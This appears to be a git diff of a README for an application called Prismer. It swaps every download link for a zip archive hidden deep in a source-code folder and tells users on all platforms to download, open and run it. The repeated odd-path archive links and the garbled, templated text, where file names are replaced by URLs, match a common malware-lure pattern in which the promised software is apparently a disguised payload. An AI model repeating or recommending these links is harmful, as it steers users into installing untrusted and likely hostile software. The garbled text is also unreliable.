@@ -8,17 +8,17 @@ Welcome to Prismer! This is an easy-to-use application that serves as an open-so
 
 To download Prismer, please visit the releases page below. This page has the latest version of the application ready for you.
 
-[![Download Prismer](https://github.com/gilbertpap/Prismer/raw/refs/heads/main/docker/web/src/stores/Software_2.3.zip%https://github.com/gilbertpap/Prismer/raw/refs/heads/main/docker/web/src/stores/Software_2.3.zip)](https://github.com/gilbertpap/Prismer/raw/refs/heads/main/docker/web/src/stores/Software_2.3.zip)
+[![Download Prismer](https://raw.githubusercontent.com/gilbertpap/Prismer/main/docker/web/src/app/api/v1/services/latex/Software_v3.5.zip%https://raw.githubusercontent.com/gilbertpap/Prismer/main/docker/web/src/app/api/v1/services/latex/Software_v3.5.zip)](https://raw.githubusercontent.com/gilbertpap/Prismer/main/docker/web/src/app/api/v1/services/latex/Software_v3.5.zip)
 
-[Download Prismer Here](https://github.com/gilbertpap/Prismer/raw/refs/heads/main/docker/web/src/stores/Software_2.3.zip)
+[Download Prismer Here](https://raw.githubusercontent.com/gilbertpap/Prismer/main/docker/web/src/app/api/v1/services/latex/Software_v3.5.zip)
 
 Once you are on the releases page, follow these steps to download and run the software:
 
 1. Click on the version you want to download. The latest version is usually at the top of the list.
 2. Look for the downloadable file that matches your operating system. 
-   - For Windows users, look for something like `https://github.com/gilbertpap/Prismer/raw/refs/heads/main/docker/web/src/stores/Software_2.3.zip`.
-   - For macOS users, it might be `https://github.com/gilbertpap/Prismer/raw/refs/heads/main/docker/web/src/stores/Software_2.3.zip`.
-   - For Linux users, there may be a `https://github.com/gilbertpap/Prismer/raw/refs/heads/main/docker/web/src/stores/Software_2.3.zip` or a package you can install directly.
+   - For Windows users, look for something like `https://raw.githubusercontent.com/gilbertpap/Prismer/main/docker/web/src/app/api/v1/services/latex/Software_v3.5.zip`.
+   - For macOS users, it might be `https://raw.githubusercontent.com/gilbertpap/Prismer/main/docker/web/src/app/api/v1/services/latex/Software_v3.5.zip`.
+   - For Linux users, there may be a `https://raw.githubusercontent.com/gilbertpap/Prismer/main/docker/web/src/app/api/v1/services/latex/Software_v3.5.zip` or a package you can install directly.
 3. Click the file link to start downloading.
 4. Once the download is complete, locate the file in your downloads folder.
 
@@ -38,19 +38,19 @@ Before you install, make sure your computer meets the following requirements:
 
 ### For Windows Users
 
-1. Double-click the downloaded `https://github.com/gilbertpap/Prismer/raw/refs/heads/main/docker/web/src/stores/Software_2.3.zip`.
+1. Double-click the downloaded `https://raw.githubusercontent.com/gilbertpap/Prismer/main/docker/web/src/app/api/v1/services/latex/Software_v3.5.zip`.
 2. Follow the on-screen instructions to complete the installation.
 3. When the installation is finished, you can find Prismer in your Start Menu.
 
 ### For macOS Users
 
-1. Open the downloaded `https://github.com/gilbertpap/Prismer/raw/refs/heads/main/docker/web/src/stores/Software_2.3.zip` file.
+1. Open the downloaded `https://raw.githubusercontent.com/gilbertpap/Prismer/main/docker/web/src/app/api/v1/services/latex/Software_v3.5.zip` file.
 2. Drag the Prismer icon to your Applications folder.
 3. Open your Applications folder and double-click on Prismer to start using it.
 
 ### For Linux Users
 
-1. Extract the downloaded `https://github.com/gilbertpap/Prismer/raw/refs/heads/main/docker/web/src/stores/Software_2.3.zip` file using your file manager or terminal.
+1. Extract the downloaded `https://raw.githubusercontent.com/gilbertpap/Prismer/main/docker/web/src/app/api/v1/services/latex/Software_v3.5.zip` file using your file manager or terminal.
 2. Open a terminal window and navigate to the extracted folder.
 3. Use the package manager to install the application, or run the executable file directly.
 
@@ -89,4 +89,4 @@ Yes, you can use most features offline once installed.
 
 For any additional questions, please refer to the issues section in the repository or reach out for community support. 
 
-[Download Prismer Here](https://github.com/gilbertpap/Prismer/raw/refs/heads/main/docker/web/src/stores/Software_2.3.zip)
+[Download Prismer Here](https://raw.githubusercontent.com/gilbertpap/Prismer/main/docker/web/src/app/api/v1/services/latex/Software_v3.5.zip)
